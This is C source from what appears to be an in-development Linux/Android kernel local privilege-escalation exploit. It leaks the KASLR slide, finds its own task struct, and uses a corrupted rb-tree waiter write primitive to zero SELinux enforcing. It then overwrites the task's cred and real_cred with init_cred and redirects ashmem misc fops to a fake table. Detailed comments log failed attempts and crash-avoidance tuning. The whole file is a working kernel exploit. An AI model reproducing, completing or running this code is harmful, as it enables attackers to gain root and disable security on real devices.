void persist_set_sweep_rev(int on) { pr_sweep_dir = on ? -1 : 1; }
void persist_set_sweep_end(int n) { pr_sweep_end = n; }
void persist_set_sweep_skip(const char *list) {
  pr_sweep_nskip = 0;
  if (!list) {
    return;
  }
  const char *s = list;
  while (*s && pr_sweep_nskip < PR_SWEEP_SKIP_MAX) {
    char *e = NULL;
    long v = strtol(s, &e, 0);
    if (e == s) {
      break;
    }
    pr_sweep_skip[pr_sweep_nskip++] = (int)v;
    s = (*e == ',') ? e + 1 : e;
  }
  pr_info("sweep skip list: %d entries\n", pr_sweep_nskip);
}
static int pr_sweep_skipped(int n) {
  for (int i = 0; i < pr_sweep_nskip; i++) {
    if (pr_sweep_skip[i] == n) {
      return 1;
    }
  }
  return 0;
}

void persist_set_seq_start(int step) { pr_seq_start = step; }
/* §124.42 slide-forensics: stop the seq after step N lands (forensics only -
   run the slide round in isolation: sweep HIT -> step 0 -> stop, print got). */
static int pr_seq_end = -1;
void persist_set_seq_end(int step) { pr_seq_end = step; }

/* §124.124 seq write helper: stage (target,value) for a write round.  Under
   SEQOVL_E4CAL the pair is redirected to the in-page sentinel (page+0x520,
   value page+0x540) so the rb_erase write geometry is exercised with zero
   system collateral; the sentinel readback (prdiff off=0x520) is the oracle. */
static void pr_seq_write(uintptr_t target, uintptr_t value) {
  const char *e4 = getenv("SEQOVL_E4CAL");
  int cal = e4 && *e4 && *e4 != '0' && page_base;
  if (cal) {
    /* calibration: mirror the ownprobe's in-page geometry exactly so the
       round-end physmap_find_self oracle is directly comparable. */
    target = dmap_alias() + 0x20;
    value = dmap_alias() + 0x40;
  }
  set_pselect_write(target, value, 0);
  /* §124.124b: the rb_erase write needs parent=value (natural geometry) to
     actually land; pr_wparent=1 redirects parent/left in-page and SUPPRESSES
     the write.  The old value=0 selinux step therefore both failed to write
     and (with parent=0) deref'd NULL - hence the selinux step is dropped. */
  pr_wparent = 0;
}

/* Plan the round for the current sequence step.  Returns 1 if this round is a
   SLIDE round (the overlay comes from the slide builder), 0 otherwise. */
static int pr_seq_plan(void) {
  /* §124.124 short seq: HIT -> E3 task (prefilled by pr_short_prefill) ->
     3 walks, no tail/PID1 chain, no banner, no read rounds. */
  if (pr_short_seq) {
    if (pr_seq_task == 0) {
      /* first short-seq round: E3 self-locate + slide (one-shot). */
      extern int perf_slide_done;
      if (!perf_slide_done) {
        if (!perf_leak_slide()) {
          pr_error("shortseq: perf slide failed - clean stop\n");
        }
      }
      if (!perf_leak_task(&pr_seq_task)) {
        pr_error("shortseq: E3 task leak failed - clean stop\n");
      }
      pr_success("shortseq: E3 task=%016zx slide=%016zx\n",
                 (size_t)pr_seq_task, (size_t)kaslr_slide);
    }
    /* §124.124 shortseq has no banner; clear the HIT relay's pending flags so
       the post-round logic advances the step instead of pinning it to 0. */
    pr_banner_pending = 0;
    pr_hit_step_pending = 0;
    switch (pr_seq_step) {
      case 0:
        /* §124.124b disable SELinux WITHOUT a zero datum: the datum (value) is
           also the rb-node parent, so value=0 deref'd NULL.  Write a
           page-aligned alias instead - its byte0 is 0, and enforcing lives at
           selinux_state+0 (CONFIG_SECURITY_SELINUX_DISABLE is off), so the
           byte written into enforcing is 0 while the pointer stays deref-safe. */
        pr_seq_write(canon_addr(SELINUX_ENFORCING), dmap_alias());
        return 0;
      case 1:
        pr_seq_write(pr_seq_task + TASK_REAL_CRED_OFF,
                     canon_addr(INIT_CRED));
        return 0;
      case 2:
        pr_seq_write(pr_seq_task + TASK_CRED_OFF,
                     canon_addr(INIT_CRED));
        return 0;
      default:
        return 0;
    }
  }
  const uintptr_t B = SLIDE_RANDOM_BOOT_ID_DATA;
  pr_wparent = 0; /* §124.108: default parent=value; write rounds opt in (case 6) */
  /* §124.21 minimal vcfi sequence: 6 rounds.  A-plan steps 3-6 (cad_pid,
     pid_links, anchor comm, init->cred) existed only to borrow PID 1's cred
     object for the u:r:init:s0 domain - but the CFI stage sets enforcing=0,
     which makes the domain irrelevant, so the static init_cred (uid 0) is
     enough.  Dropping those rounds also stops creating the async_lock
     collateral and the TGID-hlist poison. */
  if (pr_seq_vcfi_min) {
  /* §124.103 perfslide short-circuit: kaslr_base/slide prefilled
     deterministically - the banner+slide walk rounds are skipped entirely
     (no staging side effects, no walk deaths).  Step 0 passes through;
     the tail (step 1) uses the prefilled slide via canon_addr(). */
  extern int perf_slide_done;
  if (perf_slide_requested && perf_slide_done && pr_seq_step == 0) {
    pr_banner_pending = 0;
    pr_success("perfslide step 0 skip (base=%016zx slide=%016zx) - tail next\n",
               (size_t)kaslr_base, (size_t)kaslr_slide);
    return 0;
  }
  /* §124.104: perf mode skips step 2 (banner re-read) too.  The re-read's
     slide-derived address points at the TRUE banner (.rodata "Linux...") in
     perf mode - and reading a true string as an rb node DIES (§124.67 content
     lethality: strings deref'd as pointers).  The re-read only survives on
     FALSE slides (wilderness garbage).  With a deterministic slide the check
     is both lethal and pointless - skip to comm (step 3).
     §124.105: the skip uses the SLIDE overlay (return 1), not FOPS.  PERF2/3
     proved FOPS-residual staging dies in-walk 1/2 (same residual, timing race);
     SLIDE's parent (nsproxy alias, attempt-69-proven alive) keeps the first
     step predictable.  No staging write (B keeps the tail q - SLIDE left
     chases into the true tasks chain, empty tree, alive). */
  if (perf_slide_requested && perf_slide_done && pr_seq_step == 2) {
    pr_success("perfslide step 2 skip (slide deterministic) - comm next\n");
    return 1;
  }
  switch (pr_seq_step) {
      case 0:
        /* §124.52: banner gatekeeper runs BEFORE the slide (same step number).
           If the pipe is healthy it delivers the known ASCII; the slide anchor
           read that follows is then trustworthy.
           §124.57: the banner round MUST use the FOPS (neutral) overlay
           (return 0): the SLIDE overlay's nsproxy parent drags the walk to
           the nsproxy field (three banner reads all landed on 0x..0980 = the
           nsproxy low16 - systematic, not random).  Neutral chain reads value
           as-is. */
        if (pr_banner_pending) {
          set_pselect_write(B, SLIDE_LINUX_BANNER, 0);
          /* §124.61: banner round MUST use the SLIDE overlay (return 1), NOT
             neutral.  §124.57's neutral fix was wrong directionally: neutral's
             parent=value (banner alias, .rodata) sends the walk's first step
             into kernel .rodata wilderness - six consecutive HIT deaths
             (14/17/58/59b/62/67/68) all stopped inside the banner walk.
             SLIDE's parent (nsproxy alias, known kernel pointer) keeps the
             first step in a predictable zone.  Misread (the 0980 fingerprint)
             is retryable; death is not.  The bouncer (§124.56) + tail/comm
             wall deliver the posterior verdict. */
          return 1;
        }
        /* §124.46: slide source selectable.  Loggers (default) reads the
           nfulnl pointer (netd-timing-sensitive); nsproxy reads
           init_task+0x7d0 (boot-invariant).  Both report slide via their own
           anchor; the verify uses the matching anchor + alignment check. */
        set_pselect_write(B, pr_slide_ns == 2 ? SLIDE_TASK_PREV_PTR :
                             pr_slide_ns ? SLIDE_TASK_NSPROXY_PTR : SLIDE_LOGGERS_0_1, 0);
        return 1;
      case 1:
        pr_seq_q = canon_addr(INIT_TASK) + TASK_TASKS_OFF + 8;
        set_pselect_write(B, pr_seq_q, 0);
        return 0;
      case 2:
        /* §124.65 second-anchor cross-check + §124.67 slide-derived banner
           re-read.  FOPS parent=value: the walk reads 16 B AT value as an rb
           node, so value's CONTENT decides life/death (attempt 73 post-mortem):
           controlled page (sweep) lives; list_head content (step-1 tasks.prev,
           next=true task, empty pi tree) lives by luck; POINTER-to-string
           content (nsproxy field -> uts strings, banner .rodata "Linux...")
           DIES (string bytes deref'd as pointers); small-int content (cred
           usage/uid) DIES (deref 0/unmapped).  No true-kernel field is safe -
           parent must stay in controlled page or slide-derived wilderness.
           So step 2 re-reads the banner at its SLIDE-DERIVED address: true
           slide -> "Linux ve" (confirms slide AND pipe); false slide ->
           wilderness garbage (blocked, clean stop).  Expectation is link-time
           known (LINUX_BANNER_U64), address is slide-derived (readable). */
        pr_seq_q = canon_addr(SLIDE_LINUX_BANNER_IMAGE) + kaslr_slide;
        set_pselect_write(B, pr_seq_q, 0);
        return 0;
      case 3:
        pr_seq_q = pr_seq_task + TASK_COMM_OFF;
        set_pselect_write(B, pr_seq_q, 0);
        /* §124.106: comm round uses the SLIDE overlay (return 1).  FOPS parent
           (= comm target, a live string "zf9m0001" as rb node) DIES (§124.105);
           SLIDE parent (nsproxy alias, alive) survives the walk - the readout
           is a walk-transform (verify will retry/exhaust, clean stop, no
           reboot).  Forensics + transform attribution over death. */
        return 1;
      case 4:
        set_pselect_write(pr_seq_task + TASK_REAL_CRED_OFF, canon_addr(INIT_CRED), 0);
        /* §124.107: cred rounds use the SLIDE overlay (return 1).  FOPS parent
           (= init_cred, small-int usage/uid as rb node) DIES by content
           lethality; SLIDE parent (nsproxy, alive) + left (victim task, empty
           pi tree - parked, holds no locks) terminates early, alive.  Write
           rounds ignore got (verify checks trigger only), so the transform
           readout is irrelevant.
           §124.108 Q2 PERF7-update: SLIDE-nsproxy ALSO died (step-4 walk).
           left (= cred slot, victim task, state small-int at +0) kills via the
           second-layer deref.  Point SLIDE parent at the fake-anchor too
           (sibling NULL terminates before any live chase).
           §124.113 Q17-correction: SLIDE task (= true init_task) kills via the
           ADJUST path (task->pi_lock/pi_waiters on the true tree), not the
           erase path.  Read rounds live because FOPS task = fake_task
           (in-page empty tree).  Cred rounds back to FOPS (return 0):
           task = fake_task + parent = fake-anchor + left = fake+0x510 -
           fully in-page, adjust takes empty-tree branches. */
        pr_wparent = 1;
        return 0;
      case 5:
        set_pselect_write(pr_seq_task + TASK_CRED_OFF, canon_addr(INIT_CRED), 0);
        pr_wparent = 1;
        return 0;
      case 6:
        set_pselect_write(cfi_misc_fops_field(), dmap_alias() + CFI_PM_FOPS_OFF, 0);
        /* §124.108 Q2 fake-anchor: the fops write's value is an in-page alias
           (dmap+off, controllable) but FOPS parent=value would still chase it
           as an rb node - point parent at the in-page zero node instead
           (sibling NULL terminates the fixup, no live chase). */
        pr_wparent = 1;
        return 0;
      default:
        return 0;
    }
  }
  /* §124.13 Path A mini-seq: exactly two trigger rounds (slide + redirect), so
     the poison-family exposure is 2 rounds instead of 11. */
  if (pr_seq_cfi) {
    if (pr_seq_step == 0) {
      set_pselect_write(B, SLIDE_LOGGERS_0_1, 0);   /* slide: leak KASLR */
      return 1;
    }
    if (pr_seq_step == 1) {
      set_pselect_write(cfi_misc_fops_field(), dmap_alias() + CFI_PM_FOPS_OFF, 0);
      return 0;
    }
    return 0;
  }
  switch (pr_seq_step) {
    case 0:   /* slide: leak the KASLR slide (first: the validated ordering) */
      /* ?103.7 stage the slide's own write: point boot_id.data at the loggers
         array so the read-back leaks the nfulnl_logger pointer.  Without this
         the round re-executes whatever the previous (sweep) round staged, so the
         leak never happens, kaslr_base stays 0 and the read steps compute bare
         image offsets. */
      set_pselect_write(SLIDE_RANDOM_BOOT_ID_DATA, SLIDE_LOGGERS_0_1, 0);
      return 1;
    case 1:   /* B'' step 1: read init_task.tasks.prev - the most recently created
                 task (kernel/fork.c:2346: list_add_tail_rcu(&p->tasks,
                 &init_task.tasks)).  This ONE read replaces the whole per-cpu
                 route: no __per_cpu_offset, no __entry_task, no CPU pin, no ?70.
                 shape-0 damage lands on init_task+0x4D8 = pushable_tasks.prio +
                 padding (inert: init_task is the CFS idle task, sched.h:775). */
      pr_seq_q = canon_addr(INIT_TASK) + TASK_TASKS_OFF + 8;
      set_pselect_write(B, pr_seq_q, 0);
      return 0;
    case 2:   /* B'' step 2: verify the tail task is OUR parked victim thread */
      pr_seq_q = pr_seq_task + TASK_COMM_OFF;
      set_pselect_write(B, pr_seq_q, 0);
      return 0;
    case 3:   /* ?116 cad_pid read: PID 1's struct pid (init/main.c:1500 sets
                 cad_pid = get_pid(task_pid(current)) from the PID-1 init path).
                 This route avoids the process list entirely: reading
                 init_task.tasks.next would put the shape-0 collateral on
                 tasks.prev and CONFIG_DEBUG_LIST BUGs on the next fork anywhere
                 (measured 3/3 QEMU runs at lib/list_debug.c:32).  Here the
                 collateral lands on the +8 neighbour async_lock.owner - a
                 boot-time-only mutex. */
      pr_seq_q = canon_addr(CAD_PID_IMAGE);
      set_pselect_write(B, pr_seq_q, 0);
      return 0;
    case 4:   /* pid1->tasks[PIDTYPE_PID].first = &task->pid_links[0].
                 Collateral lands on pid1->tasks[1].first = the TGID hlist head,
                 which CONFIG_DEBUG_LIST does not validate in 5.10 (hlist checks
                 only arrived later) - silent. */
      pr_seq_q = pr_pid1 + PID_TASKS_OFF;
      set_pselect_write(B, pr_seq_q, 0);
      return 0;
    case 5:   /* belt-and-braces: the anchor task must really be PID 1 (comm). */
      pr_seq_q = pr_init_task + TASK_COMM_OFF;
      set_pselect_write(B, pr_seq_q, 0);
      return 0;
    case 6:   /* read PID 1's cred pointer.  MUST be +0x780 (cred), never +0x778:
                 a read at +0x778 would write its collateral at +0x780 and clobber
                 PID 1's cred pointer (init would then use UUID bytes as uid/caps).
                 The +0x788 landing is cached_requested_key - unused by init. */
      pr_seq_q = pr_init_task + TASK_CRED_OFF;
      set_pselect_write(B, pr_seq_q, 0);
      return 0;
    case 7:   /* victim->real_cred = init's cred (domain becomes u:r:init:s0).
                 Collateral (shape 0) lands on init_cred_obj+8 = gid/suid, which
                 PID 1's normal checks do not use (they use fsuid/fsgid). */
      set_pselect_write(pr_seq_task + TASK_REAL_CRED_OFF, pr_init_cred, 0);
      return 0;
    case 8:   /* victim->cred = init's cred (same object, so commit_creds' BUG_ON
                 is satisfied; the victim must NEVER exec/setuid/exit with it). */
      set_pselect_write(pr_seq_task + TASK_CRED_OFF, pr_init_cred, 0);
      return 0;
    case 9:   /* ?115.2 restore: point boot_id.data back at the real UUID buffer
                 (char sysctl_bootid[16]) so the root->reboot window does not hand
                 a task-memory pointer to every system service that reads
                 /proc/sys/kernel/random/boot_id (?113.31 leftover).  The oracle is
                 real: the round's read-back must match the boot UUID's first half.
                 It also repairs the anchor read's collateral target. */
      set_pselect_write(B, canon_addr(SYSCTL_BOOTID_IMAGE), 0);
      return 0;
    case 10:  /* §124.11 Path A: redirect ashmem_misc.fops → our in-page fake
                 file_operations table (CFI-safe .cfi_jt slots).  Shape 0: the
                 value is pointer-shaped, and its collateral *(value+8)=T lands at
                 fake_fops+8 = .llseek - inside OUR page - so the table is simply
                 re-filled after the redirect (cfi_fill_fake_fops is idempotent,
                 the equivalent of S22U's repair_fake_fops_llseek). */
      set_pselect_write(cfi_misc_fops_field(), dmap_alias() + CFI_PM_FOPS_OFF, 0);
      return 0;
    default:
      return 0;
  }
}

/* Verify the round for the current sequence step; 1 = step succeeded. */
/* §124.43: slide gate - PREFIX form (magnitude form PROVED WRONG, see below).
   The gate requires (got>>32)==0xffffffc0: the runtime nfulnl must stay in the
   ffffffc0 segment.  KNOWN FALSE-NEGATIVE: a real slide >= ~4 GB moves the VA
   out of segment (attempt 20b: true slide +0x2000600000 = 8 GB, got
   0xffffffe00ad913a0 - murdered by this gate).  KASLR re-draws every boot, so
   a murdered slide costs one reboot, not the chain.
   Why not magnitude: the attempt-18 garbage (0xffffffe82f7913a0) implies slide
   +0x2825000000 (10.8 GB) - 2 MB-aligned and < 64 GB, i.e. a LEGAL slide shape.
   Any single-value gate that admits an 8 GB true slide also admits 10.8 GB
   garbage: magnitude cannot discriminate (refuted by hand computation, zero
   device time).  The structural fix is a second-anchor cross-check (v1.1). */
static inline int pr_slide_ok(uint64_t got) {
  /* §124.56 post-verdict gate + §124.77 Q14 armour + §124.79 DOWNGRADE:
     VA39 interval [TEXT, +128GB) stays FATAL (out-of-interval derivatives are
     unmapped - walks die).  2 MB alignment is WARNING-only: dragged readouts
     are systematically misaligned, but the walk hits truth at ~6% and a
     misaligned truth must still reach the posterior wall.  Blocking all
     misaligned reads blocks the only path into seq (103-110: 8 straight
     blocks, zero deaths, zero progress).  Posterior (death/step-2 block)
     costs a reboot; a total block costs everything. */
  if ((got >> 48) != 0xffffULL) {
    return 0;
  }
  if (got < KIMAGE_TEXT_BASE || got >= KIMAGE_TEXT_BASE + 0x2000000000ULL) {
    return 0;
  }
  if ((got & 0x1fffffULL) != 0) {
    pr_warning("slide MISALIGNED got=%016llx (dragged readout likely) - "
               "passing to posterior verdict\n", (unsigned long long)got);
  }
  return 1;
}
/* §124.46: anchor-parameterised slide gate (+2 MB alignment check).  The
   nsproxy anchor reports slide = got - SLIDE_INIT_NSPROXY_IMAGE; the loggers
   anchor reports slide = got - SLIDE_NFULNL_LOGGER_IMAGE.  Same gate shape,
   different anchor - so a garbage value must simultaneously look like a slide
   from BOTH anchors to pass (it cannot: the anchors are 0xBE40 apart, and a
   torn/stale read tracks at most one of them). */
static inline int pr_slide_ok_anchor(uint64_t got, uint64_t anchor_image) {
  /* §124.56 bouncer + §124.77 Q14 armour + §124.79 DOWNGRADE (same as
     pr_slide_ok: interval FATAL, alignment WARNING, posterior decides). */
  (void)anchor_image;
  if ((got >> 48) != 0xffffULL) {
    return 0;
  }
  if (got < KIMAGE_TEXT_BASE || got >= KIMAGE_TEXT_BASE + 0x2000000000ULL) {
    return 0;
  }
  if ((got & 0x1fffffULL) != 0) {
    pr_warning("slide-anchor MISALIGNED got=%016llx - passing to posterior\n",
               (unsigned long long)got);
  }
  return 1;
}
static int pr_seq_verify(
    uint64_t got, uint64_t sidecar, int rq_errno, int consumer_ok) {
  const uintptr_t B = SLIDE_RANDOM_BOOT_ID_DATA;
  /* §124.124 short seq: all three steps are writes; judge by trigger only. */
  if (pr_short_seq) {
    return (rq_errno == 35 || rq_errno == 0) && consumer_ok > 0;
  }
  /* §124.21 vcfimin: steps 0..3 behave exactly like the normal seq (slide,
     task read + gate, nsproxy cross-check, comm verify); steps 4..6 are pure
     write rounds. */
  if (pr_seq_vcfi_min && pr_seq_step >= 4) {
    return (rq_errno == 35 || rq_errno == 0) && consumer_ok > 0;
  }

  /* §124.13 Path A mini-seq verify: step 0 = slide (same oracle), step 1 = the
     write round (no readable oracle). */
  if (pr_seq_cfi) {
    if (pr_seq_step == 0) {
      /* §124.43 magnitude gate (replaces the §124.41 prefix gate). */
      if (!pr_slide_ok(got)) {
        return 0;
      }
      kaslr_base = (uintptr_t)got -
                   (SLIDE_NFULNL_LOGGER_IMAGE - KIMAGE_TEXT_BASE);
      kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
      pr_success("seq slide stext=%016zx slide=%016zx\n",
                 (size_t)kaslr_base, (size_t)kaslr_slide);
      return 1;
    }
    if (pr_seq_step == 1) {
      return (rq_errno == 35 || rq_errno == 0) && consumer_ok > 0;
    }
    return 1;
  }
  /* §124.65 vcfimin second-anchor cross-check (step 2) + comm (step 3).
     Kept as pre-switch branches because the shared switch's case 2/3 are
     full-seq comm/cad_pid (duplicate-case break otherwise).
     §124.67: step 2 is a slide-derived banner re-read (see plan case 2):
     got must equal LINUX_BANNER_U64. */
  if (pr_seq_vcfi_min && pr_seq_step == 2) {
    /* §124.104 perf short-circuit (mirror of the plan side). */
    extern int perf_slide_done;
    if (perf_slide_requested && perf_slide_done) {
      pr_success("perfslide verify step 2 skip - comm next\n");
      return 1;
    }
    if (got == LINUX_BANNER_U64) {
      pr_success("seq banner re-read OK \"Linux ve\" (slide-derived) - slide "
                 "TRUE (double-confirmed), pipe alive, comm next\n");
      return 1;
    }
    pr_warning("seq banner re-read CROSS-CHECK FAILED got=%016llx (want Linux "
               "ve) - false slide, clean stop\n", (unsigned long long)got);
    pr_seq_fatal = 1;
    return 0;
  }
  if (pr_seq_vcfi_min && pr_seq_step == 3) {
    uint64_t want = 0;
    memcpy(&want, PR_MAIN_COMM, sizeof(want));
    if (got != want) {
      pr_warning("seq verify FAILED: tail process comm[0..7]=%016llx != \"%s\" "
                 "(getpid=%d) - will retry (another process forked after ours; "
                 "the read is harmless)\n",
                 (unsigned long long)got, PR_MAIN_COMM, (int)getpid());
      pr_seq_fatal = 1;
      return 0;
    }
    pr_success("seq verify comm[0..7]=\"%s\" == our main thread (tail "
               "process) OK\n", PR_MAIN_COMM);
    return 1;
  }
  switch (pr_seq_step) {
    case 0: {
      /* §124.103 perfslide short-circuit (mirror of the plan side): the
         slide was prefilled deterministically - pass without reading got. */
      extern int perf_slide_done;
      if (perf_slide_requested && perf_slide_done) {
        pr_banner_pending = 0;
        pr_success("perfslide verify step 0 skip - tail next\n");
        return 1;
      }
      /* §124.52 banner gatekeeper verify (same step number, runs first).
         got must be the known ASCII - else the pipe is unhealthy and the
         slide read that follows is untrustworthy. */
      if (pr_banner_pending) {
        /* §124.52 poison-bait tripwire: a read returning the nonce means the
           walk never took the copy path (pipe unhealthy at the walk level). */
        if (pr_baited && got == POISON_BAIT_U64) {
          pr_error("BAIT-READ: walk returned the poison nonce - copy path "
                   "dead, clean stop\n");
          pr_seq_fatal = 1;
          return 0;
        }
        if (got == LINUX_BANNER_U64) {
          pr_banner_pending = 0;
          pr_success("seq banner OK (pipe healthy) - slide next\n");
          return 1;
        }
        /* §124.62: banner demoted from gatekeeper to recorder.  The SLIDE-shape
           banner (§124.61) survives the walk but lands on the nsproxy cluster
           (low16 == 0x0980 fingerprint, attempt 69: ...e167bb0980) - the overlay
           parent drags the read, as predicted.  A canonical nsproxy-cluster
           read proves the pipe is ALIVE (a dead pipe returns bait/zero/garbage);
           the bouncer (§124.56) + tail/comm wall deliver the posterior verdict.
           Block only the obviously-dead pipe (non-canonical / bait / zero). */
        if (pr_baited && got == POISON_BAIT_U64) {
          pr_error("BAIT-READ: walk returned the poison nonce - copy path "
                   "dead, clean stop\n");
          pr_seq_fatal = 1;
          return 0;
        }
        if (got != 0 && (got >> 48) == 0xffffULL) {
          pr_banner_pending = 0;
          pr_success("seq banner RECORDED got=%016llx (nsproxy-cluster, pipe "
                     "alive) - slide next, posterior verdict pending\n",
                     (unsigned long long)got);
          return 1;
        }
        pr_error("seq banner FAILED got=%016llx sidecar=%016llx (want Linux ve) - pipe "
                 "unhealthy, clean stop\n", (unsigned long long)got,
                 (unsigned long long)sidecar);
        pr_seq_fatal = 1;
        return 0;
      }
      /* §124.46: anchor-matched slide verify.  nsproxy anchor reports
         slide = got - SLIDE_INIT_NSPROXY_IMAGE with 2 MB alignment; loggers
         keeps the legacy prefix gate.  §124.94: tasksprev (value 2) reports
         slide = got - SLIDE_INIT_TASKPREV_IMAGE. */
      uint64_t anchor = pr_slide_ns == 2 ? SLIDE_INIT_TASKPREV_IMAGE :
                        pr_slide_ns ? SLIDE_INIT_NSPROXY_IMAGE
                                    : SLIDE_NFULNL_LOGGER_IMAGE;
      int ok = pr_slide_ns ? pr_slide_ok_anchor(got, anchor)
                           : pr_slide_ok(got);
      if (!ok) {
        /* NOTE: pr_error() exits the process (all four utils.h branches call
           exit(-1)) - correct here: a garbage slide is unrecoverable in-boot.
           Recoverable gates above use pr_warning so the retry fires. */
        pr_error("seq slide gate FAILED got=%016llx sidecar=%016llx (%s) - "
                 "foreign page, clean stop\n", (unsigned long long)got,
                 (unsigned long long)sidecar, pr_slide_ns == 2 ? "taskprev" :
                 pr_slide_ns ? "nsproxy" : "prefix");
        pr_seq_fatal = 1;
        return 0;
      }
      kaslr_base = (uintptr_t)got - (anchor - KIMAGE_TEXT_BASE);
      kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
      /* §124.68 slide range gate (empirical, this machine): true slide 5.3 GB
         (attempt 13/14, step-6 verified); false slides 8.3/8.8/10.3/12.3/12.7
         GB (attempt 70/71b/72/73/74, all died at step 2).  A false slide
         pushes every slide-derived address out of the mapping, so the step-1/2
         walks die on unmapped deref - death itself is the posterior
         cross-check, but a reboot is expensive.  Gate at 6 GB: admits the
         known-true shape, blocks the known-false cluster, zero walks.
         §124.70 DOWNGRADED to warning: attempt 76 loggers-vs-nsproxy same-boot
         comparison yields IDENTICAL slides (0x22AD400000) from two independent
         anchors - but both share the same SLIDE overlay (same parent drag),
         so common-mode drag passes mutual verification silently.  Worse, the
         true slide redraws every boot - this boot's truth may genuinely sit
         above 6 GB, and a fatal gate would murder it without appeal.  Record
         and pass; the tail+comm wall delivers the posterior verdict (a reboot
         costs less than a murdered truth). */
      if (kaslr_slide > 0x180000000ULL) {
        pr_warning("seq slide range WATCH slide=%016zx (> 6 GB) - outside the "
                   "known-true shape, passing to posterior verdict\n",
                   (size_t)kaslr_slide);
      }
      pr_success("seq slide stext=%016zx slide=%016zx anchor=%s\n",
                 (size_t)kaslr_base, (size_t)kaslr_slide,
                 pr_slide_ns == 2 ? "taskprev" :
                 pr_slide_ns ? "nsproxy" : "loggers");
      return 1;
    }
    case 1: {
      /* B'' sanity gate BEFORE any use of the pointer: the verify round points
         boot_id.data at task+0x790, so a garbage node would gamble on a mapping.
         Canonical kernel pointer, 8-byte aligned, nonzero, and not the empty-list
         sentinel (init_task.tasks itself).  A failure here is NOT fatal: the read
         is harmless (damage lands on init_task's inert pushable_tasks), so it is
         retried with a fresh slot. */
      uintptr_t node = (uintptr_t)got;
      uintptr_t sentinel = canon_addr(INIT_TASK) + TASK_TASKS_OFF;
      if ((node >> 48) != 0xffff || (node & 7) != 0 || node == 0 ||
          node == sentinel) {
        /* §124.50: pr_error() exits (see case 2) - but this gate is explicitly
           recoverable ("retried with a fresh slot"), so warn, not error. */
        pr_warning("seq tasks.prev gate FAILED node=%016zx (q=%016zx) - harmless "
                   "read, retry with a new slot\n",
                   (size_t)node, (size_t)pr_seq_q);
        return 0;
      }
      pr_seq_task = node - TASK_TASKS_OFF;
      pr_success("seq tasks.prev node=%016zx task=%016zx (q=%016zx)\n",
                 (size_t)node, (size_t)pr_seq_task, (size_t)pr_seq_q);
      return 1;
    }
    case 2: {
      /* B'' verify: the tail task must be the parked victim thread (comm). */
      uint64_t want = 0;
      memcpy(&want, PR_MAIN_COMM, sizeof(want));
      if (got != want) {
        /* §124.50: pr_error() calls exit(-1) in ALL four utils.h branches
           (attempt 14/17 post-mortem: kmsg "Untracked pid exited status 255" -
           the main thread "vanished" right after the FAILED line, and the
           §113.30 tail-retry below never fired - it is dead code while a
           fatal verify uses pr_error).  Tail-race is recoverable: warn and let
           the retry at the bottom of the round loop redo the tail read. */
        pr_warning("seq verify FAILED: tail process comm[0..7]=%016llx != \"%s\" "
                   "(getpid=%d) - will retry (another process forked after ours; "
                   "the read is harmless)\n",
                   (unsigned long long)got, PR_MAIN_COMM, (int)getpid());
        pr_seq_fatal = 1;
        return 0;
      }
      pr_success("seq verify comm[0..7]=\"%s\" == our main thread (tail "
                 "process) OK\n", PR_MAIN_COMM);
      return 1;
    }
    case 3: {
      /* ?116 cad_pid gate: canonical pointer to PID 1's struct pid */
      uintptr_t p = (uintptr_t)got;
      if ((p >> 48) != 0xffff || (p & 7) != 0 || p == 0) {
        pr_warning("seq cad_pid gate FAILED pid=%016zx\n", (size_t)p);
        return 0;
      }
      pr_pid1 = p;
      pr_success("seq cad_pid=%016zx (PID 1 struct pid)\n", (size_t)p);
      return 1;
    }
    case 4: {
      /* pid1->tasks[0].first = &PID1->pid_links[0] -> task = link - 0x638 */
      uintptr_t link = (uintptr_t)got;
      if ((link >> 48) != 0xffff || (link & 7) != 0 || link == 0) {
        pr_warning("seq pid_links gate FAILED link=%016zx\n", (size_t)link);
        return 0;
      }
      pr_init_task = link - TASK_PID_LINKS_OFF;
      pr_success("seq PID1 pid_links=%016zx task=%016zx\n", (size_t)link, (size_t)pr_init_task);
      return 1;
    }    case 5: {
      /* comm of the anchor must be PID 1's (read from /proc/1/comm at startup) */
      uint32_t want = 0;
      memcpy(&want, pr_anchor_comm, sizeof(want));
      if ((uint32_t)got != want) {
        pr_warning("seq anchor comm FAILED got=%016llx (want \"%s\")\n",
                   (unsigned long long)got, pr_anchor_comm);
        return 0;
      }
      pr_success("seq anchor comm=\"%s\" OK (PID 1 anchor confirmed)\n",
                 pr_anchor_comm);
      return 1;
    }
    case 6: {
      uintptr_t c = (uintptr_t)got;
      if ((c >> 48) != 0xffff || (c & 7) != 0 || c == 0) {
        pr_warning("seq init->cred gate FAILED cred=%016zx\n", (size_t)c);
        return 0;
      }
      pr_init_cred = c;
      pr_success("seq init->cred=%016zx (domain will be u:r:init:s0)\n",
                 (size_t)pr_init_cred);
      return 1;
    }
    case 7:
    case 8:
    case 10:   /* Path A redirect: a write round, no readable oracle */
      /* no readable oracle for a write round: accept a clean landed trigger */
      return (rq_errno == 35 || rq_errno == 0) && consumer_ok > 0;
    case 9: {
      /* ?115.2 restore oracle: boot_id.data now points at sysctl_bootid, so the
         read-back is the original UUID's first 8 bytes again. */
      int hit = ((rq_errno == 35 || rq_errno == 0) && consumer_ok > 0);
      if (hit && memcmp(&got, pr_boot0, 8) == 0) {
        pr_success("seq restore: boot_id.data -> sysctl_bootid, first half matches "
                   "the boot UUID OK\n");
      } else {
        pr_warning("seq restore: landed=%d got=%016llx (boot UUID first half "
                   "was %016llx)\n", hit, (unsigned long long)got,
                   *(const unsigned long long *)(const void *)pr_boot0);
      }
      return hit;
    }
    default:
      return 1;
  }
}

void persist_neutralize_page(void) {
  payload_neutralize();
  pr_success("persist neutralized page (shared helper)\n");
}

static void persist_neutralize_page_unused(void) {
  payload_patch64(W0_OFF + 0x00, fake_w0);
  payload_patch64(W0_OFF + 0x08, 0);
  payload_patch64(W0_OFF + 0x10, 0);
  payload_patch64(W0_OFF + 0x18, fake_w0);
  payload_patch64(W0_OFF + 0x20, 0);
  payload_patch64(W0_OFF + 0x28, 0);
  /* §124.114 Q-verify version B (unused helper kept in sync). */
  payload_patch64(LOCK_OFF + 0x18, (fake_task | 1));
  pr_success("persist neutralized page: w0 self-rooted, owner=fake_task|1\n");
}

/* SIGALRM handler: setpriority() on the calling (waiter) thread, forcing the
   on-mutex prio adjustment that arms the dangling waiters (mirrors slide.c). */
static void pr_alarm_handler(int sig __attribute__((unused))) {
  long r = syscall(SYS_setpriority, PRIO_PROCESS, 0, 5);
  (void)r;
}

